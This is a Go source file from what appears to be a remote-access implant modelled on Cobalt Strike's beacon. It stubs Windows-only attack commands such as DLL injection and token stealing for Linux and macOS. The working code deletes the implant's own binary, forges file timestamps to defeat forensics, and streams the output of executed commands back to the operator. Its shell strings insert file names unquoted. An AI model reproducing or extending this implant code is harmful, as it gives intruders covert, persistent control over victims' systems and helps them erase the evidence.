//go:build linux || darwin

package command

import (
	"errors"
	"io"
	"main/config"
	"main/packet"
	"main/util"
	"os"
	"os/exec"
	"runtime"
)

// put unsupported func in linux and darwin here

func InjectDll(b []byte, isDllX64 bool) error {
	return errors.New("unsupported for " + runtime.GOOS)
}

func SpawnAndInjectDll(dll []byte, isDllX64 bool, ignoreToken bool) error {
	return errors.New("unsupported for " + runtime.GOOS)
}

func HandlerJobAsync(b []byte) error {
	return errors.New("unsupported for " + runtime.GOOS)
}

func ListJobs() error {
	return errors.New("unsupported for " + runtime.GOOS)
}

func KillJob(b []byte) error {
	return errors.New("unsupported for " + runtime.GOOS)
}

func RunAs(b []byte) error {
	return errors.New("unsupported for " + runtime.GOOS)
}

func GetPrivsByte(b []byte) error {
	return errors.New("unsupported for " + runtime.GOOS)
}

func StealToken(b []byte) error {
	return errors.New("unsupported for " + runtime.GOOS)
}

func Rev2self() error {
	return errors.New("unsupported for " + runtime.GOOS)
}

func MakeToken(b []byte) error {
	return errors.New("unsupported for " + runtime.GOOS)
}

func ExecAsm(b []byte, isDllX64 bool, ignoreToken bool) error {
	return errors.New("unsupported for " + runtime.GOOS)
}

func PowershellImport(b []byte) {

}
func WebDelivery(b []byte) {

}

func listDrivesImpl(b []byte) error {
	return errors.New("unsupported for " + runtime.GOOS)
}

func DeleteSelfImpl() {
	if config.DeleteSelf {
		selfName, err := os.Executable()
		if err != nil {
			return
		}
		_ = Exec([]byte(util.Sprintf("rm -f %s", selfName)))
	}
}

func TimeStompImpl(b []byte) error {
	to, from, err := parseTimeStomp(b)
	if err != nil {
		return err
	}
	return Exec([]byte(util.Sprintf("touch -c -r %s %s", string(from), string(to))))
}

func RunAsync(cmd *exec.Cmd) error {
	stdin, err := cmd.StdinPipe()
	if err != nil {
		return err
	}
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return err
	}
	// redirect stderr to stdout
	// if I read both of them in a go func, stderr will always block the function when cmd has no err output
	// In that case, I need two go func to read them asynchronously, or redirect stderr to stdout
	// (it seems go doesn't have functions like peek?)
	cmd.Stderr = cmd.Stdout
	_ = stdin.Close()
	go func() {
		var m = 0
		var cnt = 0
		var outErr error = nil
		for {
			cnt++
			outBuf := make([]byte, 0x1000)
			// block read, but in go func
			m, outErr = stdout.Read(outBuf)
			if m > 0 {
				packet.PushResult(packet.CALLBACK_OUTPUT, outBuf[:m])
			}
			if outErr != nil {
				if outErr != io.EOF {
					packet.ErrorMessage(outErr.Error())
				}
				break
			}
		}
		if err = cmd.Wait(); err != nil {
			packet.ErrorMessage(err.Error())
		} else if cnt > 2 {
			packet.PushResult(packet.CALLBACK_OUTPUT, []byte("--------------------------output end--------------------------"))
		}
	}()
	if err = cmd.Start(); err != nil {
		return err
	}
	return nil
}
